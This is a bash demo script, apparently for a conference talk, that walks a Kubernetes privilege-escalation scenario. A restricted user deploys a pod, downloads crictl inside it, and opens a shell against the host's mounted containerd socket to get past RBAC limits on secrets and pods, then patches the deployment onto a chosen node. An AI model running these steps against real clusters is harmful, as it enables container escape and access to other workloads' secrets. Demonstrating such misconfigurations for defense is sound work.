#!/usr/bin/env bash

. ../scripts/demo-magic.sh
TYPE_SPEED=${SPEED:-}

CONTAINER_RUNTIME_ENDPOINT=unix:///host/run/containerd/containerd.sock

pei "export KUBECONFIG=./user2-kubeconfig"

echo "ℹ️ Deploy the app"; read -s
pei "kubectl apply -f n2-deploy.yaml"
pei "kubectl wait --for=jsonpath='{.status.readyReplicas}=1' deploy/n2"

echo "❓ Can we read pods or secrets?"; read -s
export KUBECONFIG=./user2-kubeconfig
pe "kubectl get secret -n secret2"
pe "kubectl get pod -n secret2"

echo "❓ Do we have the tools?"
pei "kubectl exec deploy/n2 -ti -- sh -c \"curl --version\""
pei "kubectl exec deploy/n2 -ti -- sh -c \"crictl ps\""

echo "ℹ️ Get crictl"; read -s
pei "kubectl exec deploy/n2 -ti -- sh -c 'env PATH=/tmp:/bin:/usr/bin curl -L https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.30.0/crictl-v1.30.0-linux-arm64.tar.gz --output /tmp/crictl.tar.gz'"
pei "kubectl exec deploy/n2 -ti -- sh -c 'tar zxvf /tmp/crictl.tar.gz -C /tmp'"

echo "ℹ️ Let's hack"
# pe "kubectl exec deploy/n2 -ti -- sh -c \"env PATH=/tmp:/bin:/usr/bin crictl -r $CONTAINER_RUNTIME_ENDPOINT ps\""
kubectl exec deploy/n2 -ti -- sh -c "env CONTAINER_RUNTIME_ENDPOINT=$CONTAINER_RUNTIME_ENDPOINT PATH=/tmp:/bin:/usr/bin bash"

echo -n "ℹ️ Provide the node name: "; read 
sed -e "s/#NODE#/$REPLY/g" node-template.patch > /tmp/node.patch
pe "cat /tmp/node.patch"
pei "kubectl patch deployment n2 --patch-file=/tmp/node.patch"
pe "kubectl wait --for=jsonpath='{.status.readyReplicas}=1' deploy/n2"

echo "ℹ️ Get crictl"
pei "kubectl exec deploy/n2 -ti -- sh -c 'env PATH=/tmp:/bin:/usr/bin curl -L https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.30.0/crictl-v1.30.0-linux-arm64.tar.gz --output /tmp/crictl.tar.gz'"
pei "kubectl exec deploy/n2 -ti -- sh -c 'tar zxvf /tmp/crictl.tar.gz -C /tmp'"


echo "ℹ️ Let's hack"
# pe "kubectl exec deploy/n2 -ti -- sh -c \"env PATH=/tmp:/bin:/usr/bin crictl -r $CONTAINER_RUNTIME_ENDPOINT ps\""
kubectl exec deploy/n2 -ti -- sh -c "env CONTAINER_RUNTIME_ENDPOINT=$CONTAINER_RUNTIME_ENDPOINT PATH=/tmp:/bin:/usr/bin bash"
